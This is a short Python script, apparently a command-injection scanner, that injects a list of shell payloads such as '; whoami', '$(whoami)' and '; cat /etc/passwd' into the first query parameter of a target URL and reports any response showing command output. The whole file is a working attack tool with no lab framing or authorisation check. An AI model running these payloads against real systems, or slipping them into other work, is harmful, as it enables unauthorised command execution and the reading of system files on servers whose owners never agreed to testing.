#!/usr/bin/env python3
"""
Command Injection Scanner
Usage: python cmdi_scanner.py https://target.com/ping?ip=
"""

import sys
import requests
import urllib.parse

class CMDIScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # CMDi payloads
        self.payloads = [
            '; whoami',
            '| whoami',
            '& whoami',
            '&& whoami',
            '|| whoami',
            '\nwhoami\n',
            '%0a whoami %0a',
            '`whoami`',
            '$(whoami)',
            '; uname',
            '| id',
            '; id',
            '&& id',
            '|ls',
            ';ls',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& cat /etc/passwd',
        ]
    
    def test_payload(self, payload):
        """Test CMDi"""
        try:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10)
            
            # Check for command output
            indicators = ['root:', '/bin/', 'uid=', 'www-data', 'daemon']
            for ind in indicators:
                if ind in r.text:
                    return {'payload': payload, 'output': ind}
            
        except Exception as e:
            pass
        
        return None
    
    def scan(self):
        """Scan for CMDi"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result:
                print(f"[!] CMDi: {payload}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python cmdi_scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = CMDIScanner(url)
    scanner.scan()


if __name__ == "__main__":
    main()